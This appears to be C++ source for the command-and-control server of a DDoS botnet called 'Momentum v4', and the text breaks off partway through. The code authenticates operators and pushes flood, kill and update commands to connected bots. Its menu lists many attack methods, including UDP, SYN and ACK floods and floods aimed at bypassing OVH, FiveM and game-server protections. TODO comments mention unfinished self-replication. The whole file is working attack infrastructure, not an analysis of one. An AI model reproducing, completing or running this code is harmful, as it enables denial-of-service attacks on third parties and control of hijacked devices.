#include <iostream>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <thread>
#include <map>
#include <sstream>
#include <string>
#include <unistd.h>
#include <sys/epoll.h>
#include <errno.h>
#include <string.h>
#include <vector>
#include <iterator>
#include <sys/time.h>
#include <ctime>
#include <chrono>

#include "headers/main.h"
#include "headers/client.h"
#include "headers/mysql.h"
#include "headers/command.h"
#include "headers/thread.h"

/* Features to be done:
 - total bots retrieving list (ip, core_count, arch, build_id)
 - fix the bot-update
 - finish the selfrep 
 - add attacks slots limit (memory)
 - *a momentum production, badwolf & cisco 
 */

static volatile int ConnectedUser = 0;
static int global_attack_status = TRUE;


static void *admin_timeout_thread(void *arg)
{
    struct thread_data *tdata = (struct thread_data *)arg;

    pthread_barrier_wait(tdata->barrier);

    while(TRUE)
    {
        if(tdata->time + tdata->timeout < time(NULL))
        {
            close(tdata->fd);
            pthread_cancel(*tdata->admin_thread);
            break;
        }
        sleep(1);
    }

    pthread_exit(0);
}

static void terminate_client(int fd)
{
    if (client_list[fd].arch_len > 1)
        printf("\e[31m[-]\e[97m Connection terminated. (%d.%d.%d.%d) (%s)\n", client_list[fd].addr & 0xff, (client_list[fd].addr >> 8) & 0xff, (client_list[fd].addr >> 16) & 0xff, (client_list[fd].addr >> 24) & 0xff, client_list[fd].arch);

    epoll_ctl(efd, EPOLL_CTL_DEL, client_list[fd].fd, NULL);

    if(client_list[fd].fd != -1)
        close(client_list[fd].fd);

    client_list[fd].fd = -1;
    client_list[fd].connected = FALSE;
    client_list[fd].addr = 0;
    client_list[fd].authenticated = FALSE;
    client_list[fd].timeout = 0;
    client_list[fd].arch_len = 0;
    memset(client_list[fd].arch, 0, sizeof(client_list[fd].arch));

    return;
}

static void _exit(const char *str, int exit_code)
{
    std::cout << str << std::endl;
    exit(exit_code);
}

static void admin_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    admin_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!admin_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(ADMIN_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(admin_fd);
    REUSE_ADDR(admin_fd);

    ret = bind(admin_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the admin port", 1);
    }

    ret = listen(admin_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the admin port", 1);
    }

    return;
}


static void accept_client_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    struct epoll_event e;
    int ret = 0;
    int count = 0;
    struct process process;
    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
    {
        return;
    }
    e.data.fd = fd;
    e.events = EPOLLIN | EPOLLET;
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, fd, &e);
    if(ret)
    {
        return;
    }
    client_list[e.data.fd].addr = addr.sin_addr.s_addr;
    client_list[e.data.fd].fd = e.data.fd;
    for (count = 0; count < MAX_BOTS; count++)
    {
        if(!client_list[count].connected || count == e.data.fd)
        {
            continue;
        }
        if(client_list[count].addr == client_list[e.data.fd].addr) //check if ip are already auth / logged in the port
        {
            //printf("\033[37;1m[\033[33;1m~\033[37;1m] (\033[33;1m%d\033[37;1m.\033[33;1m%d\033[37;1m.\033[33;1m%d\033[37;1m.\033[33;1m%d\033[37;1m) removed due to duplicate ip\033[33;1m!\033[0m\n", client_list[e.data.fd].addr & 0xff, (client_list[e.data.fd].addr >> 8) & 0xff, (client_list[e.data.fd].addr >> 16) & 0xff, (client_list[e.data.fd].addr >> 24) & 0xff);
            client_list[e.data.fd].fd = -1;
            break;
        }
    }
    if(client_list[e.data.fd].fd == -1)
    {
        return;
    }
    client_list[e.data.fd].connected = TRUE;
    client_list[e.data.fd].authenticated = FALSE;
    client_list[e.data.fd].timeout = time(NULL);
    client_list[e.data.fd].arch_len = 0;
    memset(client_list[e.data.fd].arch, 0, sizeof(client_list[e.data.fd].arch));
    //printf("\033[37;1m[\033[32;1m+\033[37;1m] (\033[32;1m%d\033[37;1m.\033[32;1m%d\033[37;1m.\033[32;1m%d\033[37;1m.\033[32;1m%d\033[37;1m) Connection accepted\033[32;1m!\033[0m\n", client_list[e.data.fd].addr & 0xff, (client_list[e.data.fd].addr >> 8) & 0xff, (client_list[e.data.fd].addr >> 16) & 0xff, (client_list[e.data.fd].addr >> 24) & 0xff);
    return;
}

static void trim(char *str)
{
    int i, begin = 0, end = strlen(str) - 1;

    while (isspace(str[begin]))
        begin++;

    while ((end >= begin) && isspace(str[end]))
        end--;

    for (i = begin; i <= end; i++)
        str[i - begin] = str[i];

    str[i - begin] = '\0';
}

static int parse_count(struct process *process)
{
    int count = 0;
    int x = 0;
    std::stringstream stream;
    std::string out;
    std::string n;

    stream << process->buf;

    std::getline(stream, out, ' ');
    n = out;

    process->f = process->buf;
    process->f.erase(0, n.length() + 1);

    n.erase(0, 1);

    count = stoi(n);

    if(count == 0 || (process->ptr->max_clients == -1 && count == -1) || (process->ptr->max_clients != -1 && count > process->ptr->max_clients))
        return 0;

    process->count = count;
    return 1;
}

static void flood(struct command *ptr, struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;

    data.type = TYPE_FLOOD;

    memset(data.buf, 0, sizeof(data.buf));

    memcpy(data.buf, ptr->buf, ptr->buf_len);

    for(x = 0; x < MAX_BOTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
            continue;
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
            break;
    }

    return;
}


static std::map<std::string, int> statistics(void)
{
    int i = 0;
    std::map<std::string, int> t;

    for(i = 0; i < MAX_BOTS; i++)
    {
        if(!client_list[i].authenticated || !client_list[i].connected)
            continue;
        t[client_list[i].arch]++;
    }

    return t;
}

int client_count(int max_clients)
{
    int i = 0;
    int x = 0;

    for(i = 0; i < MAX_BOTS; i++)
    {
        if(!client_list[i].authenticated || !client_list[i].connected)
            continue;
        if(max_clients != -1 && x == max_clients)
            break;
        x++;
    }

    return x;
}

void *kbot(void *arg)
{
    struct admin *login = (struct admin *)arg;
    struct admin p;
    while(TRUE)
    {
        std::stringstream title;

        p.username = login->username;
        mysql_set_restrictions(&p);

        title << "\033]0;";
        title << "connections: " << client_count(p.max_clients) <<" | users: " << ConnectedUser;
        title << "\007";

        send(login->fd, title.str().c_str(), title.str().length(), MSG_NOSIGNAL);
    }
}

void *basic(void *arg)
{
    struct admin *login = (struct admin *)arg;
    struct admin p;

    while(TRUE)
    {
        std::stringstream title;

        p.username = login->username;
        mysql_set_restrictions(&p);

        title << "\033]0;";
        title << "" << client_count(p.max_clients) <<" Bots | " << ConnectedUser <<" Users";
        title << "\007";

        send(login->fd, title.str().c_str(), title.str().length(), MSG_NOSIGNAL);
    }
}

void *title_counter(void *arg)
{
    struct admin *login = (struct admin *)arg;
    struct admin p;

    while(TRUE)
    {
        std::stringstream title;

        p.username = login->username;
        mysql_set_restrictions(&p);
  
        title << "\033]0;";
        title <<  client_count(p.max_clients);
        title << " bots | online users: " << ConnectedUser;
        title << " | welcome back >: "<< p.username;
        title << "\007";

        send(login->fd, title.str().c_str(), title.str().length(), MSG_NOSIGNAL);
    }
}

static std::vector<std::string> split(const std::string& s, char delimiter)
{
    std::vector<std::string> tokens;
    std::string token;
    std::istringstream tokenStream(s);
    while (std::getline(tokenStream, token, delimiter))
    {
        tokens.push_back(token);
    }

    return tokens;
}

static std::tuple<int, std::string> recv_line(int fd)
{
    int ret = 0;
    std::string str;

    while(1)
    {
        int np = 0;
        int rp = 0;
        char out[4096];

        memset(out, 0, sizeof(out));

        ret = recv(fd, out, sizeof(out), MSG_NOSIGNAL);
        if(ret <= 0)
        {
            return std::tuple<int, std::string>(ret, str);
        }

        str = out;

        np = str.find("\n");
        rp = str.find("\r");

        if(np != -1)
        {
            str.erase(np);
        }

        if(rp != -1)
        {
            str.erase(rp);
        }

        if(str.length() == 0)
        {
            continue;
        }

        break;
    }

    return std::tuple<int, std::string>(ret, str);
}

static void kill_self(struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;
    data.type = TYPE_KILL;
    for(x = 0; x < MAX_BOTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
        {
            continue;
        }
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
        {
            break;
        }
    }
    return;
}


static void update_bots(struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;
    data.type = TYPE_UPD;
    for(x = 0; x < MAX_BOTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
        {
            continue;
        }
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
        {
            break;
        }
    }
    return;
}



static void *admin(void *arg)
{
    int fd = -1;
    std::stringstream stream;
    pthread_t counter;
    char user[4096];
    char pass[4096];
    char banner1[1024];
    char banner2[1024];
    char banner3[1024];
    char banner4[1024];
    char banner5[1024];
    char banner6[1024];
    char banner7[1024];
    char master[1024];
    struct admin login;
    int load = 0;
    struct thread_data *tdata = (struct thread_data *)arg;
    struct thread_data t;
    pthread_barrier_t barrier;
    pthread_t admin_timeout;
    int ex = 0;
    int ret = 0;
    std::string banner;
    int np = 0;
    int rp = 0;
    std::tuple<int, std::string> line;

    pthread_barrier_wait(tdata->barrier);

    fd = tdata->fd;

    pthread_barrier_init(&barrier, NULL, 1);

    t.fd = fd;
    t.time = time(NULL);
    t.barrier = &barrier;
    t.admin_thread = tdata->admin_thread;
    t.timeout = 60;

    pthread_create(&admin_timeout, NULL, admin_timeout_thread, (void *)&t);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    line = recv_line(fd);

    send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
    send(fd, "\r", 1, MSG_NOSIGNAL);

    if(strcmp(std::get<std::string>(line).c_str(), MANAGER_AUTH_KEY))
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    send(fd, "                                                                 \e[31;1m#####\r\n", strlen("                                                                 \e[31;1m#####\r\n"), MSG_NOSIGNAL);
    send(fd, "                                                                \e[31;1m#######\r\n", strlen("                                                                \e[31;1m#######\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m                   #                                            \e[31;1m##\e[37;1mO\e[31;1m#\e[37;1mO\e[31;1m##\r\n", strlen("\e[36;1m                   #                                            \e[31;1m##\e[37;1mO\e[31;1m#\e[37;1mO\e[31;1m##\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m  ######          ###                                           \e[31;1m#\e[37;1mVVVVV\e[31;1m#\r\n", strlen("\e[36;1m  ######          ###                                           \e[31;1m#\e[37;1mVVVVV\e[31;1m#\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##             #                                          \e[31;1m##  \e[37;1mVVV  \e[31;1m##\r\n", strlen("\e[36;1m    ##             #                                          \e[31;1m##  \e[37;1mVVV  \e[31;1m##\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##         ###    ### ####   ###    ###  ##### #####     \e[31;1m#          ##\r\n", strlen("\e[36;1m    ##         ###    ### ####   ###    ###  ##### #####     \e[31;1m#          ##\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##        #  ##    ###    ##  ##     ##    ##   ##      \e[31;1m#  \e[38;5;81;41mMomentum\e[0m  \e[31;1m##\r\n", strlen("\e[36;1m    ##        #  ##    ###    ##  ##     ##    ##   ##      \e[31;1m#  \e[38;5;81;41mMomentum\e[0m  \e[31;1m##\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##       #   ##    ##     ##  ##     ##      ###        \e[31;1m#     \e[38;5;81;41mv4\e[0m     \e[0m\e[31;1m###\r\n", strlen("\e[36;1m    ##       #   ##    ##     ##  ##     ##      ###        \e[31;1m#     \e[38;5;81;41mv4\e[0m     \e[0m\e[31;1m###\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##          ###    ##     ##  ##     ##      ###       \e[31;1mQQ#           ##Q\r\n", strlen("\e[36;1m    ##          ###    ##     ##  ##     ##      ###       \e[31;1mQQ#           ##Q\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##       # ###     ##     ##  ##     ##     ## ##    \e[31;1mQQQQQQ#       #QQQQQQ\r\n", strlen("\e[36;1m    ##       # ###     ##     ##  ##     ##     ## ##    \e[31;1mQQQQQQ#       #QQQQQQ\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m    ##      ## ### #   ##     ##  ###   ###    ##   ##   \e[31;1mQQQQQQQ#     #QQQQQQQ\r\n", strlen("\e[36;1m    ##      ## ### #   ##     ##  ###   ###    ##   ##   \e[31;1mQQQQQQQ#     #QQQQQQQ\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[36;1m  ############  ###   ####   ####   #### ### ##### #####   \e[31;1mQQQQQ#######QQQQQ\r\n\r\n", strlen("\e[36;1m  ############  ###   ####   ####   #### ### ##### #####   \e[31;1mQQQQQ#######QQQQQ\r\n\r\n"), MSG_NOSIGNAL);
    send(fd, "\e[37;1mUsername\e[1;34m:\e[97m ", strlen("\e[37;1mUsername\e[1;34m:\e[97m "), MSG_NOSIGNAL);

    line = recv_line(fd);

    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    memcpy(user, std::get<std::string>(line).c_str(), std::get<std::string>(line).length());
    send(fd, "\e[37;1mpassword\e[1;34m:\e[97m ", strlen("\e[37;1mpassword\e[1;34m:\e[97m "), MSG_NOSIGNAL);


    line = recv_line(fd);

    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    memcpy(pass, std::get<std::string>(line).c_str(), std::get<std::string>(line).length());

    login.user_ptr = user;
    login.pass_ptr = pass;
    pthread_cancel(counter);
    send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
    send(fd, "\r", 1, MSG_NOSIGNAL);
    send(fd, "\e[37;1mcredentials checking process", strlen("\e[37;1mcredentials checking process"), MSG_NOSIGNAL);
    for(load = 0; load < 4; load++)
    {
        send(fd, "\e[1;34m.\e[0m", strlen("\e[1;34m.\e[0m"), MSG_NOSIGNAL);
        sleep(1);
    }
    if(!mysql_login(&login))
    {
        send(fd, "\r\n\e[91mAdios!\e[0m\r\n", strlen("\r\n\e[91mAdios!\e[0m\r\n"), MSG_NOSIGNAL);
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    pthread_cancel(admin_timeout);

    login.fd = fd;

    mysql_set_restrictions(&login);

    if(login.authenticated)
    {
        send(fd, "\r\n\e[93muser already connected. ip reported back.\e[31m!\e[0m\r\n", strlen("\e[93muser already connected. ip reported back.\e[31m!\e[0m\r\n"), MSG_NOSIGNAL);
        close(fd);
        pthread_exit(0);
        ConnectedUser--;
    }

    mysql_update_login(&login, 1);
    ConnectedUser++;
    // User has been disabled for a indefinite amount of time
    if(login.disable)
    {
        send(fd, "\e[93myour account has been disabled. ask an administrator.\e[38;5;25m!\e[0m\r\n", strlen("\e[93myour account has been disabled. ask an administrator.\e[38;5;25m!\e[0m\r\n"), MSG_NOSIGNAL);
        pthread_exit(0);
    }
    pthread_cancel(counter);

      send(fd, "\033[2J\033[H-successfuly connected on \e[38;5;81;41mMomentum Network\e[1m\e[0m\r\n", strlen("\033[2J\033[H-successfuly connected on \e[38;5;81;41mMomentum Network\e[1m\e[0m\r\n"), MSG_NOSIGNAL);
      sleep(1);
      pthread_cancel(counter);
      pthread_create(&counter, NULL, title_counter, (void *)&login);
      send(fd, "    -\e[31;1m* \e[37;1mWelcome into Momentum V4\e[31;1m *\e[0m\r\n", strlen("    -\e[31;1m* \e[37;1mWelcome into Momentum V4\e[31;1m *\e[0m\r\n"), MSG_NOSIGNAL);
      send(fd, "    -\t\e[31;1mtype '\e[32;1mhelp\e[31;1m' for display menu \e[37;1m!\e[0m\r\n", strlen("    -\e[31;1mtype '\e[36;1mhelp\e[31;1m' for display menu \e[37;1m!\e[0m\r\n"), MSG_NOSIGNAL);
      if(!global_attack_status == FALSE)
        {
            send(fd, "\e[31;1m attacks Status: \e[32menabled\r\n\r\n", strlen("\e[31;1m attacks Status: \e[32menabled\r\n\r\n"), MSG_NOSIGNAL);
        } else {
      send(fd, "\e[31;1mattacks Status: \e[37m disabled - maintenance.\r\n\r\n", strlen("\e[31;1mattacks Status: \e[37m disabled - maintenance.\r\n\r\n"), MSG_NOSIGNAL);
      }
      send(fd, banner.c_str(), banner.length(), MSG_NOSIGNAL);
      send(fd, "\r\n\r\n", 4, MSG_NOSIGNAL);

    if(!login.admin == 0){
        stream << "\r\e[97m"<< login.username <<"\e[32m@\e[97mbotnet:~/admin/\e[0m\e[32m#\e[0m ";
    } else {
        stream << "\r\e[97m"<< login.username <<"\e[32m@\e[97mbotnet:~/client/\e[0m\e[32m#\e[0m ";
    }
    // Spawn a thread to update a active title counter

    while(TRUE)
    {
        char buf[4096];
        struct process process;
        struct command *ptr;
        int x = 0;
        std::string data;
        int g = 0;
        int count = 0;
        int cooldown = 0;
        int concurrent_user = 0;
        int maxclikos = 0;
        int time_boot = 0;
        int np = 0;
        int rp = 0;

        memset(buf, 0, sizeof(buf));

        // Send the admin a fake prompt for user input
        ret = send(fd, stream.str().c_str(), stream.str().length(), MSG_NOSIGNAL);

        if(ret <= 0)
        {
            break;
        }

        g = recv(fd, buf, sizeof(buf), MSG_NOSIGNAL);

        if(g <= 0)
        {
            break;
        }

        data = buf;

        np = data.find("\n");
        rp = data.find("\r");

        if(np != -1)
        {
            data.erase(np);
        }

        if(rp != -1)
        {
            data.erase(rp);
        }

        if(data == "")
        {
            continue;
        }

        mysql_set_restrictions(&login);
        count = client_count(login.max_clients);
        concurrent_user = login.concurrent;
        cooldown = login.cooldown;
        maxclikos = login.max_clients;
        time_boot = login.max_time;

        if(login.disable)
        {
            send(fd, "\e[93mUser has been disabled\e[38;5;25m!\e[0m\r\n", 39, MSG_NOSIGNAL);
            break;
        }

        if(data == "ps1"){
                stream << "\r\e[37;1mbotnet:~#                        \e[0m";
                stream << "";
                stream << "\r\e[37;1mbotnet:~# \e[0m";
                continue;
        }

        if(data == "ps2"){
            if(login.admin == 1){
                stream << "\r\e[97m"<< login.username <<"\e[32m@\e[97mbotnet:~/admin/\e[0m\e[32m#\e[0m ";
            }
            if(login.admin == 0){
                stream << "\r\e[97m"<< login.username <<"\e[32m@\e[97mbotnet:~/client/\e[0m\e[32m#\e[0m ";
            }
            continue;
        }

        if(data == "ps3"){
                stream << "\r\e[37;1mbotnet:~#                                                         \e[0m";
                stream << "";
                stream << "\r\e[0m"<< login.username <<"\e[38;5;25m@\e[0mbotnet\e[38;5;25m# \e[37;1m";
                continue;
        }

        if(data == "title basic"){
            pthread_cancel(counter);
            pthread_create(&counter, NULL, basic, (void *)&login);
            continue;
        }
        if(data == "title basic2"){
            pthread_cancel(counter);
            pthread_create(&counter, NULL, kbot, (void *)&login);
            continue;
        }
        if(data == "title original"){
            pthread_cancel(counter);
            pthread_create(&counter, NULL, title_counter, (void *)&login);
            continue;
        }

        if(data == "methods" || data == "?")
        {
            send(fd, "\033[2J\033[H\r\n\e[38;5;25mCommand usage: \e[37;1m![method] [ip] [time] port=[port]\r\n\r\n", strlen("\033[2J\033[H\r\n\e[38;5;25mCommand usage: \e[37;1m![method] [ip] [time] port=[port]\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !udp\e[38;5;25m: \e[37;1mgeneric udp flood\r\n", strlen("\e[0m  !udp\e[38;5;25m: \e[37;1mgeneric udp flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !udpbypass\e[38;5;25m: \e[37;1mudp flood custom for bypassing firewall rules\r\n", strlen("\e[0m  !udpbypass\e[38;5;25m: \e[37;1mudp flood custom for bypassing firewall rules\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !voltudp\e[38;5;25m: \e[37;1mudp flood optimized for more pps\r\n\r\n", strlen("\e[0m  !voltudp\e[38;5;25m: \e[37;1mudp flood optimized for more pps\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !ack\e[38;5;25m: \e[37;1mtcp ack flood\r\n", strlen("\e[0m  !ack\e[38;5;25m: \e[37;1mtcp ack flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !syn\e[38;5;25m: \e[37;1mtcp syn flood\r\n", strlen("\e[0m  !syn\e[38;5;25m: \e[37;1mtcp syn flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !tcpovh\e[38;5;25m: \e[37;1mtcp flood custom for bypassing ovh headers\r\n", strlen("\e[0m  !tcpovh\e[38;5;25m: \e[37;1mtcp flood custom for bypassing ovh headers\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !burstcp\e[38;5;25m: \e[37;1mACK optimized for high PPS.\r\n\r\n", strlen("\e[0m  !tcpburst\e[38;5;25m: \e[37;1mACK optimized for high PPS.\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !udpvse\e[38;5;25m: \e[37;1mvalve source engine flood\r\n", strlen("\e[0m  !udpvse\e[38;5;25m: \e[37;1mvalve source engine flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !udprand\e[38;5;25m: \e[37;1mrandomized udp generic flood\r\n", strlen("\e[0m  !udprand\e[38;5;25m: \e[37;1mrandomized udp generic flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !udpfivem\e[38;5;25m: \e[37;1mudp flood custom for bypassing fivem\r\n", strlen("\e[0m  !udpfivem\e[38;5;25m: \e[37;1mudp flood custom for bypassing fivem\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !hex\e[38;5;25m: \e[37;1mudp flood custom udp flood with hex packet\r\n", strlen("\e[0m  !hex\e[38;5;25m: \e[37;1mudp flood custom udp flood with hex packet\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !tcpcookie\e[38;5;25m: \e[37;1mtcp flood cookie spam session\r\n", strlen("\e[0m  !tcpcookie\e[38;5;25m: \e[37;1mtcp flood cookie spam session\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !tcpmix\e[38;5;25m: \e[37;1mtcp flood custom with multi flags\r\n\r\n", strlen("\e[0m  !tcpmix\e[38;5;25m: \e[37;1mtcp flood custom with multi flags\r\n\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !protocol\e[38;5;25m: \e[37;1mrandom protocol flood\r\n", strlen("\e[0m  !protocol\e[38;5;25m: \e[37;1mrandom protocol flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !esp\e[38;5;25m: \e[37;1mesp layer3 flood\r\n", strlen("\e[0m  !esp\e[38;5;25m: \e[37;1mesp layer3 flood\r\n"), MSG_NOSIGNAL);
            send(fd, "\e[0m  !ethernet\e[38;5;25m: \e[37;1mcustom ethernet layer flood\r\n\r\n", strlen("\e[0m  !ethernet\e[38;5;25m: \e[37;1mcustom ethernet layer flood\r\n\r\n"), MSG_NOSIGNAL);
            continue;
        }

        if(data == "help")
        {
            send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);

          sprintf(banner1,  "\033[33;1m                                  __�������__\r\n");
          sprintf(banner2,  "\033[33;1m                                _��\033[33;1m  _\033[33;1m _\033[33;1m    ��_\r\n");
          sprintf(banner3,  "\033[33;1m                                �\033[33;1m   ������_\033[33;1m   �\r\n");
          sprintf(banner4,  "\033[33;1m                  \e[38;5;81;41mMomentum v4\e[1m\e[0m \033[33;1m> �\033[33;1m    �____�\033[33;1m   � < \e[38;5;81;41mMomentum v4\e[1m\e[0m\r\n");
          sprintf(banner5,  "\033[33;1m                                �\033[33;1m    �\033[33;1m    �\033[33;1m   � \r\n");
          sprintf(banner6,  "\033[33;1m                                ��_\033[33;1m ������\033[33;1m  _��\r\n");
          sprintf(banner7,  "\033[33;1m                                  ���_____���\r\n\r\n");


            send(fd, banner1, strlen(banner1), MSG_NOSIGNAL);
            send(fd, banner2, strlen(banner2), MSG_NOSIGNAL);
            send(fd, banner3, strlen(banner3), MSG_NOSIGNAL);
            send(fd, banner4, strlen(banner4), MSG_NOSIGNAL);
            send(fd, banner5, strlen(banner5), MSG_NOSIGNAL);
            send(fd, banner6, strlen(banner6), MSG_NOSIGNAL);
            send(fd, banner7, strlen(banner7), MSG_NOSIGNAL);
            send(fd, "\e[38;5;25m-\e[97m Help Menu \e[38;5;25m-\r\n", strlen("\e[38;5;25m-\e[97m Help Menu \e[38;5;25m-\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[38;5;25mmy statistics\e[38;5;25m:\e[37;1m Check your account informations.\r\n", strlen("   \e[38;5;25mmy statistics\e[38;5;25m:\e[37;1m Check your account informations.\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[38;5;25mbots\e[38;5;25m:\e[37;1m Bots connected on the network.\r\n", strlen("   \e[38;5;25mbots\e[38;5;25m:\e[37;1m Bots connected on the network.\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[38;5;25mbots arch\e[38;5;25m:\e[37;1m Bots architecture.\r\n", strlen("   \e[38;5;25mbots arch\e[38;5;25m:\e[37;1m Bots architecture.\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[38;5;25mmethods/?\e[38;5;25m:\e[37;1m Methods list.\r\n", strlen("   \e[38;5;25mmethods/?\e[38;5;25m:\e[37;1m Methods list.\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[38;5;25mclear\e[38;5;25m:\e[37;1m Clear the screen.\r\n", strlen("   \e[38;5;25mclear\e[38;5;25m:\e[37;1m Clear the screen.\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[38;5;25mmotd\e[38;5;25m:\e[37;1m See the message of the day updated by admin.\r\n", strlen("   \e[38;5;25mmotd\e[38;5;25m:\e[37;1m See the message of the day updated by admin.\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[38;5;25mconfiguration\e[38;5;25m:\e[37;1m See all different style available.\r\n", strlen("   \e[38;5;25mconfiguration\e[38;5;25m:\e[37;1m See all different style available.\r\n"), MSG_NOSIGNAL);
            send(fd, "   \e[38;5;25mquit\e[38;5;25m:\e[37;1m Leave the network.\r\n", strlen("   \e[38;5;25mquit\e[38;5;25m:\e[37;1m Leave the network.\r\n"), MSG_NOSIGNAL);
            if(login.admin == 1){
                send(fd, "\r\n\e[38;5;25m- \e[97mAdmin Options \e[38;5;25m-\r\n", strlen("\r\n\e[38;5;25m- \e[97mAdmin Options \e[38;5;25m-\r\n"), MSG_NOSIGNAL);
                send(fd, "   \e[38;5;25mattacks <enable/disable>\e[38;5;25m:\e[37;1m Enable/disable attacks on the network.\r\n", strlen("   \e[38;5;25mattacks <enable/disable>\e[38;5;25m:\e[37;1m Enable/disable attacks on the network.\r\n"), MSG_NOSIGNAL);
                send(fd, "   \e[38;5;25mupdate\e[38;5;25m:\e[37;1m Update the bots with new bins.\r\n", strlen("   \e[38;5;25mupdate\e[38;5;25m:\e[37;1m Update the bots with new bins.\r\n"), MSG_NOSIGNAL);
                send(fd, "   \e[38;5;25mbotkill\e[38;5;25m:\e[37;1m Kill all bots currently connected.\r\n", strlen("   \e[38;5;25mbotkill\e[38;5;25m:\e[37;1m Kill all bots currently connected.\r\n"), MSG_NOSIGNAL);
                send(fd, "   \e[38;5;25madmin panel\e[38;5;25m:\e[37;1m Administrator control panel.\r\n", strlen("   \e[38;5;25madmin panel\e[38;5;25m:\e[37;1m Administrator control panel.\r\n"), MSG_NOSIGNAL);

            }
            continue;
        }

            if(data == "configuration"){
                std::stringstream configstream;
                send(fd, "\e[38;5;25m-\e[97mBanner available\e[38;5;25m-\r\n", strlen("\e[38;5;25m-\e[97mBanner available\e[38;5;25m-\r\n"), MSG_NOSIGNAL);
                send(fd, "  \e[38;5;25mLinux  :\e[37;1m Linux banner with Tux\r\n", strlen("  \e[38;5;25mLinux  :\e[37;1m Linux banner with Tux\r\n"), MSG_NOSIGNAL);
                send(fd, "  \e[38;5;25mBitcoin:\e[37;1m Bitcoin banner with Momentum v4 tag\r\n", strlen("  \e[38;5;25mBitcoin:\e[37;1m Bitcoin banner with Momentum v4 tag\r\n"), MSG_NOSIGNAL);
                send(fd, "  \e[38;5;25mDefault:\e[37;1m Banner with attack status\r\n", strlen("  \e[38;5;25mDefault:\e[37;1m Banner with attack status\r\n"), MSG_NOSIGNAL);
                send(fd, "\e[38;5;25m-\e[97mTitle available\e[38;5;25m-\r\n", strlen("\e[38;5;25m-\e[97mTitle available\e[38;5;25m-\r\n"), MSG_NOSIGNAL);;
                configstream << "  \e[38;5;25mtitle basic2   >\e[37;1m connections: " << count <<" | users: " << ConnectedUser;
                configstream << "\r\n  \e[38;5;25mtitle basic    >\e[37;1m "<< count <<" Bots | " << ConnectedUser <<" Users";
                configstream << "\r\n  \e[38;5;25mtitle original >\e[37;1m Momentum | Devices: " << count <<" | Active users: "<< ConnectedUser <<" | Logged as: "<< login.username;
                configstream << "\r\n";
                send(fd, configstream.str().c_str(), configstream.str().length(), MSG_NOSIGNAL);
                continue;
            }

            if(data == "Linux" || data == "linux"){
                send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
                send(fd, "                                                                 \e[31;1m#####\r\n", strlen("                                                                 \e[31;1m#####\r\n"), MSG_NOSIGNAL);
